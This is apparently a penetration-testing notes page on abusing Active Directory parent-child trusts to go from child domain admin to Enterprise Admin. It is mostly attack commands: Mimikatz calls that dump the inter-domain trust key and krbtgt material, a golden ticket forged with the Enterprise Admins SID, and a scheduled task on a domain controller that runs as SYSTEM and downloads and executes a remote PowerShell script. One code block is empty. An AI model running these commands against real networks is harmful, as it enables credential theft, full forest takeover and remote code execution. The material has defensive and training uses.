# Trusted Key

## Trusted Key

Require to be domain Admin on the child domain

Can lead to Enterprise Admin compromise.

{% hint style="info" %}
* Child to Forest Root
* Domains in the same forest have a implicit 2-ways trust with other domains.
* Trust key between parent and child domains
{% endhint %}

2 ways to escalate privileges between 2 domains in the same forest :

* krbtgt hash
* Trust Tickets

## KRBTGT

### Get the Trust key

{% hint style="warning" %}
2 techniques are available :

* **lsadump::trust /patch**
* **lsadump::dcsync**
{% endhint %}

```csharp
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc02
```

![](<../../../../.gitbook/assets/image (2) (1).png>)

#### Second technique

```csharp
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:crook.badcorp.local /user:badcorp$"'
```

![](<../../../../.gitbook/assets/image (176).png>)

{% hint style="warning" %}
To access to the Root forest, the domain controller in the child forest will create a TGT for Root forest DC and indicate that it’s a referral to a TGS. This TGT is not signed by the krbtgt password hash but instead with the trust key
{% endhint %}

### Golden ticket to Root Forest Enterprise Admins

#### Get krbtgt hash on the child domain

```csharp
```

#### Golden Ticket

* Domains SID&#x20;

![](<../../../../.gitbook/assets/image (54).png>)

#### - Golden ticket :

```csharp
Invoke-Mimikatz -command '"kerberos::golden /user:idontexit /domain:crook.badcorp.local /krbtgt:redacted /sid:S-1-5-21-xxxxxxxxx-xxxxxx-xxxxx /sids:S-1-5-21-xxxxxxx-xxxxxx-519 /ptt"'
```

![](<../../../../.gitbook/assets/image (290).png>)

### Get shell

```csharp
 schtasks /create /S DC.test.lab.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR  "powershell.exe -c 'iex (New-Object  Net.WebClient).DownloadString(''http://172.16.100.82/polo.ps1''')'"
 schtasks.exe /run /S DC.test.lab.local /TN "STCheck"
```
